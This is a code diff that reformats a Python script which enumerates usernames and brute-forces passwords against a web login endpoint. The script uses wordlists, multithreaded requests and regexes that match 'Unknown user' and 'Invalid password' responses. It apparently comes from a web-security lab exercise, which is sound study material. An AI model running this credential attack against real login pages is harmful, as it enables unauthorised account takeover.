@@ -13,7 +13,7 @@ USERNAME_FIELD = "username"
 PASSWORD_FIELD = "password"
 HEADERS = {
     HeaderField.CONTENT_TYPE.value: ContentType.FORM_URL.value[0],
-    HeaderField.ACCEPT.value: ContentType.HTML.value[0]
+    HeaderField.ACCEPT.value: ContentType.HTML.value[0],
 }
 
 
@@ -27,7 +27,13 @@ def crack_username(ip, instance_id):
     path = "/".join((instance_id, ENDPOINT))
     req_template = HttpRequest(ip, method=HttpMethod.POST, path=path, headers=HEADERS)
     regex = r">Unknown user<"
-    return h.parallel_attack(req_template, generate_uname_req, f(regex, True), data_file="uname_list.txt", threads=20)
+    return h.parallel_attack(
+        req_template,
+        generate_uname_req,
+        f(regex, True),
+        data_file="uname_list.txt",
+        threads=20,
+    )
 
 
 def crack_password(ip, instance_id, username):
@@ -42,7 +48,13 @@ def crack_password(ip, instance_id, username):
     req_template = HttpRequest(ip, method=HttpMethod.POST, path=path, headers=HEADERS)
     regex = r">Invalid password<"
     passwd_req_gen = get_passwd_func(username)
-    return h.parallel_attack(req_template, passwd_req_gen, f(regex, True), data_file="uname_list.txt", threads=10)
+    return h.parallel_attack(
+        req_template,
+        passwd_req_gen,
+        f(regex, True),
+        data_file="uname_list.txt",
+        threads=10,
+    )
 
 
 def generate_uname_req(template, value):
